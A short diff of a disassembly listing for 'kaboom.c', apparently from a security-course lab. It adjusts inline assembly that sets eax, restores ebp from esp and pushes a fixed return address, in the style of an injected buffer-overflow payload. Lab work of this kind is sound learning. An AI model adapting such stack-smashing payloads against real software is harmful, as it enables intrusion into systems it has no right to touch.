@@ -124,8 +124,8 @@ int main() {
   asm("movl $0x77fe0719, %eax");
     117d:	b8 19 07 fe 77       	mov    $0x77fe0719,%eax
 /home/chiro/programs/comp3052-lab/lab1/kaboom.c:5
-  asm("lea (0x18+4)(%esp), %ebp");
-    1182:	8d 6c 24 1c          	lea    0x1c(%esp),%ebp
+  asm("lea 0x18(%esp), %ebp");
+    1182:	8d 6c 24 18          	lea    0x18(%esp),%ebp
 /home/chiro/programs/comp3052-lab/lab1/kaboom.c:6
   asm("push $0x8049595");
     1186:	68 95 95 04 08       	push   $0x8049595
